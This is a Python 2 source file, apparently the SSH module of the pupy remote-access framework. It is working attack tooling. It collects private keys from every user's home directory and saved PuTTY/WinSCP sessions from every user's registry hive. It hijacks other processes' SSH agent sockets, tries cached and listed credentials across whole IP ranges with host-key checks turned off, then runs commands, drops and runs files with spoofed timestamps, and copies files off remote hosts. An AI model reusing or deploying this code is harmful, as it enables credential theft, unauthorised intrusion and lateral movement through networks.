# -*- encoding: utf-8 -*-

__all__ = [
    'SSHNotConnected', 'SSH',
    'ssh_interactive',
    'ssh_exec', 'ssh_hosts',
    'ssh_upload_file',
    'ssh_download_file', 'ssh_download_tar'
]

from threading import Thread, Event
from io import BytesIO

from psutil import process_iter

from os import path, walk, environ
from getpass import getuser

from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from paramiko.config import SSHConfig
from paramiko.ssh_exception import (
    SSHException, NoValidConnectionsError
)

from paramiko.dsskey import DSSKey
from paramiko.rsakey import RSAKey
from paramiko.ecdsakey import ECDSAKey

from urllib import unquote

from sys import getfilesystemencoding

from traceback import format_exc

try:
    from puttykeys import ppkraw_to_openssh
except ImportError:
    def ppkraw_to_openssh(x):
        return None

try:
    from paramiko.ed25519key import Ed25519Key
except ImportError:
    Ed25519Key = None

from netaddr import (IPNetwork, AddrFormatError)
from urlparse import urlparse

from socket import error as socket_error, gaierror

from rpyc import async

SUCCESS_CACHE = {}

try:
    import pupy
    from pupy import obtain

    if not hasattr(pupy, 'creds_cache'):
        setattr(pupy, 'creds_cache', {})

    if 'ssh' not in pupy.creds_cache:
        pupy.creds_cache['ssh'] = {}

    SUCCESS_CACHE = pupy.creds_cache['ssh']

except ImportError:
    def obtain(x):
        return x

class SSHNotConnected(Exception):
    pass

KEY_CLASSES = [RSAKey, ECDSAKey, DSSKey]
if Ed25519Key:
    KEY_CLASSES.append(Ed25519Key)

try:
    from _winreg import (
        OpenKey, CloseKey, EnumKey, EnumValue, HKEY_USERS
    )
    from ctypes import (
        WinDLL, POINTER, byref, GetLastError,
        create_unicode_buffer, c_void_p
    )
    from ctypes.wintypes import (
        LPSTR, LPWSTR, DWORD, BOOL
    )

    LPDWORD = POINTER(DWORD)
    PVOID = c_void_p

    REG_PATHS = [
       r'\Software\SimonTatham\PuTTY\Sessions',
       r'\Software\Martin Prikryl\WinSCP 2\Sessions'
    ]

    PROPERTIES_MAPPING = {
       'hostname': 'hostname',
       'portnumber': 'port',
       'username': 'user',
       'publickeyfile': 'identityfile'
    }

    advapi32 = WinDLL('advapi32', use_last_error=True)
    kernel32 = WinDLL('kernel32', use_last_error=False)

    _LookupAccountSidW = advapi32.LookupAccountSidW
    _LookupAccountSidW.argtypes = [LPSTR, PVOID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, LPDWORD]
    _LookupAccountSidW.restype = BOOL

    _ConvertStringSidToSid = advapi32.ConvertStringSidToSidA
    _ConvertStringSidToSid.argtypes = [LPSTR, PVOID]
    _ConvertStringSidToSid.restype = BOOL

    _LocalFree = kernel32.LocalFree
    _LocalFree.argtypes = [PVOID]

    # From LaZagne
    def LookupAccountSidW(lpSid):
        # From https://github.com/MarioVilas/winappdbg/blob/master/winappdbg/win32/advapi32.py

        PSID = PVOID()
        if not _ConvertStringSidToSid(lpSid, byref(PSID)):
            return None, None, None

        ERROR_INSUFFICIENT_BUFFER = 122
        cchName = DWORD(0)
        cchReferencedDomainName = DWORD(0)
        peUse = DWORD(0)
        success = _LookupAccountSidW(
            None, PSID, None, byref(cchName),
            None, byref(cchReferencedDomainName), byref(peUse))

        error = GetLastError()
        if not success or error == ERROR_INSUFFICIENT_BUFFER:
            lpName = create_unicode_buffer(u'', cchName.value + 1)
            lpReferencedDomainName = create_unicode_buffer(
                u'', cchReferencedDomainName.value + 1)

            success = _LookupAccountSidW(
                None, PSID, lpName, byref(cchName),
                lpReferencedDomainName, byref(cchReferencedDomainName), byref(peUse))

            if success:
                return lpName.value, lpReferencedDomainName.value, peUse.value

        _LocalFree(PSID)
        return None, None, None

    def bin_decode(value):
        try:
            if value.startswith('\xEF\xBB\xBF'):
                return value[3:].decode('utf-8')
            elif value.startswith('\xFE\xFF'):
                return value[2:].decode('utf-16be')
            elif value.startswith('\xFF\xFE'):
                return value[2:].decode('utf-16le')
            elif value.startswith('\x00\x00\xFE\xFF'):
                return value[4:].decode('utf-32be')
            elif value.startswith('\xFF\xFE\x00\x00'):
                return value[2:].decode('utf-32le')
            else:
                return value.decode(getfilesystemencoding())
        except UnicodeDecodeError:
            return 'bad:'+value

    def extract_info(key):
        try:
            h = OpenKey(HKEY_USERS, key)
        except WindowsError:
            return {}

        alias = key.split('\\')[-1]

        info = {}

        if '@' in alias:
            user, alias = alias.split('@', 1)
            info['user'] = user
            if ':' in alias:
                maybe_alias, maybe_port = alias.rsplit(':', 1)
                try:
                    maybe_port = int(maybe_port)
                    if maybe_port > 0 and maybe_port < 65536:
                        alias = maybe_alias
                        info['port'] = maybe_port

                except ValueError:
                    pass

            info['hostname'] = alias
        elif alias == 'Default%20Settings':
            alias = '*'

        try:
            idx = 0
            while True:
                try:
                    name, value, _ = EnumValue(h, idx)
                except WindowsError:
                        break

                if type(value) in (str, unicode):
                    new_value = unquote(value)
                    if new_value != value:
                        if type(new_value) == unicode:
                            try:
                                new_value = new_value.encode('latin1')
                                value = bin_decode(new_value)
                            except UnicodeEncodeError:
                                value = new_value

                name = name.lower()
                if name in PROPERTIES_MAPPING:
                    if name == 'publickeyfile':
                        info[PROPERTIES_MAPPING[name]] = [value]
                    else:
                        info[PROPERTIES_MAPPING[name]] = value

                idx += 1

        finally:
            CloseKey(h)

        if info and (alias == '*' or info.get('hostname')):
            return {alias: info}

        return {}

    def ssh_putty_hosts():
        results = {}

        try:
            h = OpenKey(HKEY_USERS, '')
        except WindowsError:
            return

        idx = 0

        try:
            while True:
                user = EnumKey(h, idx)

                username, domain, _ = LookupAccountSidW(user)

                if username is None:
                    username = user
                    if domain:
                        user = domain + '\\' + user

                for reg_path in REG_PATHS:
                    try:
                        sessions = user + reg_path
                        h2 = OpenKey(HKEY_USERS, sessions)
                    except WindowsError:
                        continue

                    try:
                        idx2 = 0
                        while True:
                            session = EnumKey(h2, idx2)
                            record = extract_info(sessions + '\\' + session)
                            if record:
                                if username not in results:
                                    results[username] = {}

                                results[username].update(record)

                            idx2 += 1
                    except WindowsError:
                        pass

                    finally:
                        CloseKey(h2)

                idx += 1

        except WindowsError:
            return results

        finally:
            CloseKey(h)

except ImportError:
    def ssh_putty_hosts():
        return {}

def ssh_hosts():
    paths = []
    configs = {}

    try:
        import pwd
        for pw in pwd.getpwall():
            config_path = path.join(pw.pw_dir, '.ssh', 'config')
            if path.isfile(config_path):
                paths.append((pw.pw_name, config_path))

    except ImportError:
        config_path = path.expanduser(path.join('~', '.ssh', 'config'))
        if path.isfile(config_path):
            import getpass
            paths = [(getpass.getuser(), config_path)]

    for user, config_path in paths:
        ssh_config = SSHConfig()
        try:
            with open(config_path) as config:
                ssh_config.parse(config)

        except OSError:
            continue

        configs[user] = {
            host:ssh_config.lookup(host) for host in ssh_config.get_hostnames()
        }

    configs.update(ssh_putty_hosts())
    return configs

class SSH(object):
    __slots__ = (
        'user', 'passwords', 'key_passwords', 'private_key',
        'host', 'port', 'timeout',
        '_client', '_iter_private_keys',
        '_success_args', '_ssh_hosts',
        '_interactive'
    )

    def __init__(self, host, port=22, user=None, passwords=None, key_passwords=None, private_keys=None,
                 private_key_path=None, interactive=False, timeout=None):
        self.host = host
        self.port = port
        self.user = user
        self.timeout  = timeout
        self.passwords = passwords
        self.key_passwords = key_passwords

        self._interactive = interactive

        self._client = None
        self._success_args = None

        self._ssh_hosts = ssh_hosts()

        for user, hosts in self._ssh_hosts.iteritems():
            for alias, config in hosts.iteritems():
                if self.host in (alias, config.get('hostname')):
                    if self.user is not None and self.user != config.get('user', user):
                        continue

                    if 'hostname' in config:
                        self.host = config['hostname']

                    if 'port' in config:
                        self.port = int(config['port'])

                    self.user = config.get('user', user)

                    if 'identityfile' in config and not private_keys:
                        private_keys = []

                        identityfiles = config['identityfile']
                        if type(identityfiles) in (str, unicode):
                            identityfiles = [identityfiles]

                        for identityfile in identityfiles:
                            try:
                                import pwd
                                user_home = pwd.getpwnam(user).pw_dir
                                identityfile = path.sep.join(
                                    x if x != '~' else user_home for x in path.split(identityfile)
                                )
                            except (ImportError, KeyError):
                                identityfile = path.expanduser(identityfile)

                            if not path.isfile(identityfile):
                                continue

                            with open(identityfile) as identityfile_obj:
                                private_keys.append((identityfile, identityfile_obj.read()))

                    break

        if private_keys:
            private_keys = [
                (None, key_data) if not type(key_data) == tuple else key_data
                    for key_data in private_keys
            ]
            self._iter_private_keys = iter(private_keys)
        else:
            self._iter_private_keys = self._find_private_keys_everywhere()

        if self.port is None:
            self.port = 22

        self._connect()
        if self.connected:
            SUCCESS_CACHE[frozenset((self.host, self.port, self.user))] = self._success_args

    @property
    def success_args(self):
        return tuple([self._success_args.get(x, None) for x in (
            'host', 'port', 'user', 'password', 'key_password', 'key',
            'key_file', 'agent_socket', 'auto', 'cached'
        )])

    def _find_agent_sockets(self):
        pairs = set()

        if 'SSH_AUTH_SOCK' in environ and environ['SSH_AUTH_SOCK']:
            pair = (getuser(), environ['SSH_AUTH_SOCK'])

            pairs.add(pair)
            yield pair

        for process in process_iter():
            try:
                info = process.as_dict()
            except OSError:
                continue

            if 'environ' not in info or info['environ'] is None:
                continue

            if 'SSH_AUTH_SOCK' in info['environ']:
                pair = (info['username'], info['environ']['SSH_AUTH_SOCK'])
                if pair in pairs:
                    continue

                pairs.add(pair)

                yield pair

    def _find_private_keys_everywhere(self):
        try:
            import pwd
            for pw in pwd.getpwall():
                for key_record in self._find_private_keys(path.join(pw.pw_dir, '.ssh')):
                    yield key_record

        except ImportError:
            for key_record in self._find_private_keys(
                path.expanduser(path.join('~', '.ssh'))):
                yield key_record

    def _find_private_keys(self, fpath):
        if path.isfile(fpath):
            try:
                with open(fpath) as content:
                    yield fpath, content.read()

            except OSError:
                pass

            return

        for root, dirs, files in walk(fpath):
            for sfile in files:
                try:
                    sfile_path = path.join(root, sfile)
                    with open(sfile_path) as content:
                        first_line = content.readline(256)
                        if 'PRIVATE KEY-----' in first_line:
                            yield sfile_path, first_line + content.read()

                except (OSError, IOError):
                    pass

    @property
    def connected(self):
        return self._client is not None

    def _check_connected(self):
        if self._client is None:
            raise SSHNotConnected()

    def _oneway_upstream(self, session, reader_cb, stdout_cb, stderr_cb, on_exit=None):
        exit_status = None

        while True:
            while session.recv_ready():
                data = session.recv(65535)
                if data:
                    stdout_cb(data)

            while session.recv_stderr_ready():
                data = session.recv_stderr(65535)
                if data:
                    stderr_cb(data)

            if session.exit_status_ready():
                break

            portion, more = reader_cb()

            if portion:
                session.sendall(portion)

            if not more:
                session.shutdown_write()
                break

        while True:
            r, e, eof = self._poll_read(session)

            if r:
                while session.recv_ready():
                    data = session.recv(65535)
                    if data:
                        stdout_cb(data)

            if e:
                while session.recv_stderr_ready():
                    data = session.recv_stderr(65535)
                    if data:
                        stderr_cb(data)

            if eof:
                break

        while True:
            data = session.recv(65535)
            if data:
                stdout_cb(data)
            else:
                break

        while True:
            data = session.recv_stderr(65535)
            if data:
                stderr_cb(data)
            else:
                break

        exit_status = session.recv_exit_status()
        if on_exit:
            on_exit(exit_status)

        return exit_status

    def upload_file(self, reader_cb, remote_path, perm=0755, rtouch=None,
                     chown=None, run=False, delete=False, append=False, cat='cat', completed_cb=None):

        self._check_connected()

        transport = self._client.get_transport()

        session = transport.open_session()

        commands = []

        if delete:
            commands.append('rm -f {}'.format(repr(remote_path)))

        commands.append(
            "{} {} {}".format(cat, '>>' if append else '>', repr(remote_path))
        )

        if rtouch:
            commands.append('touch -r {} {}'.format(repr(rtouch), repr(remote_path)))

        if chown:
            commands.append('chown {} {}'.format(repr(chown), repr(remote_path)))

        if perm and type(perm) in (str, unicode):
            perm = int(perm, 8)

        commands.append('chmod {} {}'.format(oct(perm), repr(remote_path)))

        if run:
            commands.append('{}'.format(repr(remote_path)))

        if delete:
            commands.append('rm -f {}'.format(repr(remote_path)))

        command = ' && '.join(commands)

        session.exec_command(command)

        def _reader_cb():
            data = reader_cb(transport.default_max_packet_size - 1024)
            if data:
                return data, True
            else:
                return '', False

        stdout = BytesIO()
        stderr = BytesIO()

        exit_status = self._oneway_upstream(session, _reader_cb, stdout.write, stderr.write)

        if completed_cb:
            completed_cb(exit_status, stdout.getvalue(), stderr.getvalue())

        return stdout, stderr, exit_status

    def download_file(self, remote_path, write_cb, completed_cb=None, cat='cat'):
        self._check_connected()

        commands = [
            '([ -x {} ] && echo -n 1 || echo -n 0)'.format(repr(remote_path)),
            'cat {}'.format(repr(remote_path))
        ]

        command = ' && '.join(commands)

        first_byte = []
        size = [0]

        def _on_stdout(data):
            size[0] += len(data)

            if not first_byte:
                first_byte.append(data[0])
                if len(data) > 1:
                    write_cb(data[1:])
            else:
                write_cb(data)

        _, stderr, exit_status = self.check_output(
            command,
            on_stdout=_on_stdout)

        if completed_cb:
            completed_cb(exit_status, stderr.getvalue())

        return bool(first_byte[0]) if first_byte else None, stderr, exit_status

    def download_tar(self, remote_path, write_cb, completed_cb, compression='z'):
        self._check_connected()

        commands = []

        commands.append('cd /')
        commands.append('tar zcf - {}'.format(remote_path))

        command = ' && '.join(commands)

        _, stderr, exit_status = self.check_output(
            command, on_stdout=write_cb)

        if completed_cb:
            completed_cb(exit_status, stderr.getvalue())

        return exit_status, stderr, exit_status


    def _shell_reader(self, session, on_data, on_exit):
        while True:
            r, e, eof = self._poll_read(session)

            if r:
                while session.recv_ready():
                    data = session.recv(65535)
                    if data:
                        on_data(data)

            if e:
                while session.recv_stderr_ready():
                    data = session.recv_stderr(65535)
                    if data:
                        on_data(data)

            if eof:
                exit_status = session.recv_exit_status()
                if on_exit:
                    on_exit(exit_status)

                break


    def shell(self, term, w, h, wp, hp, shell=None, on_data=None, on_exit=None):
        self._check_connected()

        transport = self._client.get_transport()

        session = transport.open_session()
        session.get_pty(term, w, h, wp, hp)

        if shell is None:
            session.invoke_shell()
        else:
            session.exec_command(shell)

        def attach():
            reader = Thread(
                name='SSH Interactive Reader',
                target=self._shell_reader,
                args=(session, on_data, on_exit))

            reader.daemon = False
            reader.start()

        # shutdown both
        def shutdown():
            session.shutdown(2)

        # compatible with pupy's order
        def resize_pty(h, w, hp, wp):
            session.resize_pty(w, h, wp, hp)

        return attach, session.sendall, resize_pty, shutdown

    def check_output(self, command, pty=False, env=None, on_stdout=None, on_stderr=None, on_exit=None):
        self._check_connected()

        transport = self._client.get_transport()

        session = transport.open_session()
        session.exec_command(command)
        session.shutdown_write()

        stdout = BytesIO() if on_stdout is None else None
        if not on_stdout:
            on_stdout = stdout.write

        stderr = BytesIO() if on_stderr is None else on_stdout
        if not on_stderr:
            on_stderr = stderr.write

        exit_status = None

        while True:
            r, e, eof = self._poll_read(session)

            while r:
                data = session.recv(65535)
                if data:
                    on_stdout(data)
                r = session.recv_ready()

            while e:
                data = session.recv_stderr(65535)
                if data:
                    on_stderr(data)
                e = session.recv_stderr_ready()

            if eof:
                break

        # Read last bytes from buffer
        # Looks like some kind of bug in paramiko..

        while True:
            data = session.recv(65535)
            if data:
                on_stdout(data)
            else:
                break

        while True:
            data = session.recv_stderr(65535)
            if data:
                on_stderr(data)
            else:
                break

        exit_status = session.recv_exit_status()
        if on_exit:
            on_exit(exit_status)

        return stdout, stderr, exit_status


    def close(self):
        if not self._client:
            return

        self._client.close()
        self._client = None

    def _poll_read(self, channel, stdout=True, stderr=True):
        wait = Event()

        if stdout:
            channel.in_buffer.set_event(wait)

        if stderr:
            channel.in_stderr_buffer.set_event(wait)

        while True:
            recv = False
            error = False
            eof = False

            if stdout and channel.recv_ready():
                recv = True

            if stderr and channel.recv_stderr_ready():
                error = True

            if channel.eof_received or channel.exit_status_ready():
                eof = True

            if recv or error or eof:
                return recv, error, eof

            wait.wait()

        return None, None, None

    def _convert(self, keydata, passwords):
        if 'PuTTY-User-Key-File-2' in keydata:
            for password in passwords:
                password = '' if password is None else password

                try:
                    converted = ppkraw_to_openssh(keydata, password)
                    if not converted:
                        return keydata

                    return converted
                except ValueError:
                    pass

        return keydata

    def _connect(self):
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.load_system_host_keys()

        # 0. If host in SUCCESS_CACHE try this first
        success_cache_key = frozenset((self.host, self.port, self.user))
        if success_cache_key in SUCCESS_CACHE:
            auth_info = SUCCESS_CACHE.get(success_cache_key)
            if auth_info.get('password'):
                try:
                    client.connect(
                        password=auth_info['password'],
                        hostname=self.host,
                        port=self.port,
                        username=auth_info['user'],
                        allow_agent=False,
                        look_for_keys=False,
                        gss_auth=False,
                        compress=not self._interactive,
                        timeout=self.timeout
                    )

                    self._client = client
                    self._success_args = auth_info
                    self._success_args['cached'] = True
                    return True

                except SSHException:
                    client.close()

            elif auth_info.get('agent_socket'):
                SSH_AUTH_SOCK_bak = environ.get('SSH_AUTH_SOCK', None)
                environ['SSH_AUTH_SOCK'] = auth_info['agent_socket']

                try:
                    client.connect(
                        hostname=self.host,
                        port=self.port,
                        username=auth_info['user'],
                        allow_agent=True,
                        look_for_keys=False,
                        password=None,
                        compress=not self._interactive,
                        timeout=self.timeout
                    )

                    self._client = client
                    self._success_args = auth_info
                    self._success_args['cached'] = True
                    return True

                except SSHException:
                    client.close()

                finally:
                    if SSH_AUTH_SOCK_bak is None:
                        del environ['SSH_AUTH_SOCK']
                    else:
                        environ['SSH_AUTH_SOCK'] = SSH_AUTH_SOCK_bak

            elif auth_info.get('pkey'):
                try:
                    client.connect(
                        hostname=self.host,
                        port=self.port,
                        username=auth_info['user'],
                        pkey=auth_info['pkey'],
                        allow_agent=False,
                        look_for_keys=False,
                        gss_auth=False,
                        compress=not self._interactive,
                        timeout=self.timeout
                    )

                    self._client = client
                    self._success_args = auth_info
                    self._success_args['cached'] = True
                    return True

                except SSHException:
                    client.close()

        current_user = getuser()

        # 1. If password try password
        if self.passwords:
            for password in self.passwords:
                username = self.user or current_user

                try:
                    client.connect(
                        password=password,
                        hostname=self.host,
                        port=self.port,
                        username=username,
                        allow_agent=False,
                        look_for_keys=False,
                        gss_auth=False,
                        compress=not self._interactive,
                        timeout=self.timeout
                    )

                    self._client = client
                    self._success_args = {
                        'host': self.host,
                        'port': self.port,
                        'user': username,
                        'password': password,
                        'auto': True,
                        'cached': False,
                    }
                    return True

                except SSHException:
                    client.close()

        # 2. Try agent, default methods etc
        for username, SSH_AUTH_SOCK in self._find_agent_sockets():

            SSH_AUTH_SOCK_bak = environ.get('SSH_AUTH_SOCK', None)
            environ['SSH_AUTH_SOCK'] = SSH_AUTH_SOCK

            username = self.user or username

            try:
                client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=username,
                    allow_agent=True,
                    look_for_keys=False,
                    password=None,
                    compress=not self._interactive,
                    timeout=self.timeout
                )

                self._client = client
                self._success_args = {
                    'host': self.host,
                    'port': self.port,
                    'user': username,
                    'agent_socket': SSH_AUTH_SOCK,
                    'auto': False,
                    'cached': False
                }
                return True

            except SSHException:
                client.close()

            finally:
                if SSH_AUTH_SOCK_bak is None:
                    del environ['SSH_AUTH_SOCK']
                else:
                    environ['SSH_AUTH_SOCK'] = SSH_AUTH_SOCK_bak

        # 3. Try all found pkeys
        for key_file, key_data in self._iter_private_keys:
            username = self.user or current_user

            key_passwords = list(self.key_passwords)
            key_passwords.insert(0, None)
            found_key_password = None

            key_data = self._convert(key_data, key_passwords)

            pkey_obj = BytesIO(str(key_data))
            pkey = None

            for klass in KEY_CLASSES:
                for key_password in key_passwords:
                    try:
                        pkey_obj.seek(0)
                        pkey = klass.from_private_key(
                            pkey_obj, password=key_password)
                        found_key_password = key_password
                        break
                    except SSHException:
                        continue

            if pkey is None:
                continue

            try:
                client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=username,
                    pkey=pkey,
                    allow_agent=False,
                    look_for_keys=False,
                    gss_auth=False,
                    compress=not self._interactive,
                    timeout=self.timeout
                )

                self._client = client
                self._success_args = {
                    'host': self.host,
                    'port': self.port,
                    'user': username,
                    'key': key_data,
                    'key_file': key_file,
                    'key_password': found_key_password,
                    'pkey': pkey,
                    'auto': False,
                    'cached': False
                }
                return True

            except SSHException:
                client.close()

        if not self._client and client:
            client.close()

def ssh_interactive(term, w, h, wp, hp, host, port, user, passwords,
                    private_keys, program, data_cb, close_cb, timeout):
    private_keys = obtain(private_keys)
    passwords = obtain(passwords)
    data_cb = async(data_cb)
    close_cb = async(close_cb)

    ssh_passwords, key_passwords = passwords

    try:
        ssh = SSH(host, port, user, ssh_passwords, key_passwords, private_keys, interactive=True, timeout=timeout)
        if not ssh.connected:
            raise ValueError('No valid credentials found to connect to {}:{} user={}'.format(
                ssh.host, ssh.port, ssh.user or 'any'))

    except gaierror as e:
        raise ValueError('Unable to connect to {}:{} - {}'.format(host, port, e.strerror))

    except NoValidConnectionsError:
        raise ValueError('Unable to connect to {}:{}'.format(host, port))

    attach, writer, resizer, closer = ssh.shell(
        term, w, h, wp, hp, program, data_cb, close_cb
    )

    def ssh_close():
        closer()
        ssh.close()

    return attach, writer, resizer, ssh_close

def iter_hosts(hosts, default_passwords=None, default_port=None, default_user=None):
    if type(hosts) in (str, unicode):
        hosts = [hosts]

    ssh_passwords, key_passwords = default_passwords

    for host in hosts:

        if '://' not in host:
            host = 'ssh://' + host

        uri = urlparse(host)
        host = uri.hostname
        port = uri.port or default_port
        user = uri.username or default_user
        passwords = tuple([uri.password]) if uri.password else ssh_passwords

        if uri.path and uri.path[0] == '/' and len(uri.path) > 1 and len(uri.path) < 4:
            try:
                bits = int(uri.path[1:])
                if bits >= 16 and bits <= 32:
                    host += uri.path
            except ValueError:
                pass

        try:
            net = IPNetwork(host)
        except AddrFormatError:
            yield host, port, user, passwords, key_passwords
        else:
            for ip in net:
                yield str(ip), port, user, passwords, key_passwords

# data_cb - tuple
# 1 - Type: 0 - Connection, Data, Exit
# If connection:
# 2 - Connected
# 3,4,5,6 - host, port, user, password

def _ssh_cmd(ssh_cmd, thread_name, arg, hosts, port, user, passwords, private_keys, data_cb, close_cb, timeout):
    hosts = obtain(hosts)
    private_keys = obtain(private_keys)

    default_passwords = obtain(passwords)
    default_user = user
    default_port = port

    data_cb = async(data_cb)
    close_cb = async(close_cb)

    current_connection = [None]
    closed = Event()

    def ssh_exec_thread():
        for host, port, user, passwords, key_passwords in iter_hosts(
            hosts, default_passwords, default_port, default_user):

            if closed.is_set():
                break

            ssh = None

            try:
                ssh = SSH(host, port, user, passwords, key_passwords, private_keys, timeout=timeout)
                if not ssh.connected:
                    data_cb((0, True, ssh.host, ssh.port, ssh.user))
                    continue


                current_connection[0] = ssh

            except (socket_error, NoValidConnectionsError):
                if ssh:
                    data_cb((0, False, ssh.host, ssh.port, ssh.user))
                else:
                    data_cb((0, False, host, port, user))

                continue

            except Exception as e:
                data_cb((3, 'Exception: {}: {}\n{}'.format(
                    type(e), str(e), format_exc(limit=20))))
                continue

            conninfo = [4]
            conninfo.extend(ssh.success_args)

            data_cb(tuple(conninfo))

            def remote_data(data):
                data_cb((1, data))

            if closed.is_set():
                break

            try:
                if ssh_cmd == SSH.check_output:

                    def remote_exit(status):
                        data_cb((2, status))

                    ssh_cmd(
                        ssh, arg,
                        on_stdout=remote_data, on_stderr=remote_data,
                        on_exit=remote_exit
                    )
                else:
                    if ssh_cmd == SSH.upload_file:
                        def remote_exit(status, stdout, stderr):
                            if stdout:
                                data_cb((1, stdout))

                            if stderr:
                                data_cb((3, stderr))

                            data_cb((2, status))

                        src, dst, touch, perm, chown, run, delete = arg
                        ssh_cmd(ssh, *arg, completed_cb=remote_exit)

                    elif ssh_cmd in (SSH.download_file, SSH.download_tar):
                        def remote_exit(status, stderr):
                            if stderr:
                                data_cb((3, stderr))

                            data_cb((2, status))

                        ssh_cmd(
                            ssh, arg, remote_data,
                            completed_cb=remote_exit
                        )
            finally:
                ssh.close()

    def ssh_exec_thread_wrap():
        try:
            ssh_exec_thread()
        finally:
            try:
                closed.set()
            except:
                pass

            try:
                close_cb()
            except:
                pass

    thread = Thread(
        name=thread_name,
        target=ssh_exec_thread_wrap
    )
    thread.daemon = True
    thread.start()

    return closed.set

def ssh_exec(command, hosts, port, user, passwords, private_keys, data_cb, close_cb, timeout):
    hosts = obtain(hosts)
    private_keys = obtain(private_keys)
    passwords = obtain(passwords)

    return _ssh_cmd(
        SSH.check_output,
        'SSH (Exec) Non-Interactive Reader',
        command,
        hosts, port, user, passwords, private_keys,
        data_cb, close_cb, timeout
    )

def ssh_upload_file(src, dst, perm, touch, chown, run, delete, hosts,
                    port, user, passwords, private_keys, data_cb, close_cb, timeout):
    hosts = obtain(hosts)
    private_keys = obtain(private_keys)
    passwords = obtain(passwords)
    dst = path.expanduser(dst)

    return _ssh_cmd(
        SSH.upload_file,
        'SSH (Upload) Non-Interactive Reader',
        [src, dst, perm, touch, chown, run, delete],
        hosts, port, user, passwords, private_keys,
        data_cb, close_cb, timeout
    )

def ssh_download_file(src, hosts, port, user, passwords, private_keys, data_cb, close_cb, timeout):
    hosts = obtain(hosts)
    private_keys = obtain(private_keys)
    passwords = obtain(passwords)
    src = path.expanduser(src)

    return _ssh_cmd(
        SSH.download_file,
        'SSH (Download/Single) Non-Interactive Reader',
        src,
        hosts, port, user, passwords, private_keys,
        data_cb, close_cb, timeout
    )

def ssh_download_tar(src, hosts, port, user, passwords, private_keys, data_cb, close_cb, timeout):
    hosts = obtain(hosts)
    private_keys = obtain(private_keys)
    passwords = obtain(passwords)
    src = path.expanduser(src)

    return _ssh_cmd(
        SSH.download_tar,
        'SSH (Download/Tar) Non-Interactive Reader',
        src,
        hosts, port, user, passwords, private_keys,
        data_cb, close_cb, timeout
    )

if __name__ == '__main__':
    def try_int(x):
        try:
            return int(x)
        except:
            return x

    import sys
    import logging

    root_logger = logging.getLogger()
    logging_stream = logging.StreamHandler()
    logging_stream.setFormatter(logging.Formatter('%(asctime)-15s| %(message)s'))
    logging_stream.setLevel('DEBUG')
    root_logger.handlers = []
    root_logger.addHandler(logging_stream)
    root_logger.setLevel('DEBUG')

    s = SSH(*[try_int(x) for x in sys.argv[1:]])
    stdout, stderr, status = s.check_output('sleep 1 && id && sleep 1 && whoami')

    print status
    print stdout.getvalue()
    print stderr.getvalue()

    print "Upload"
    test = BytesIO('Hello, world!\n')
    stdout, stderr, status = s.upload_file(test.read, '/tmp/test123', rtouch='/bin/bash', append=True)

    print status
    print stdout.getvalue()
    print stderr.getvalue()

    print "Download"
    test = BytesIO()
    executable, stderr, status = s.download_file('/tmp/test123', test.write)
    print status
    print executable
    print test.getvalue()
    print stderr.getvalue()
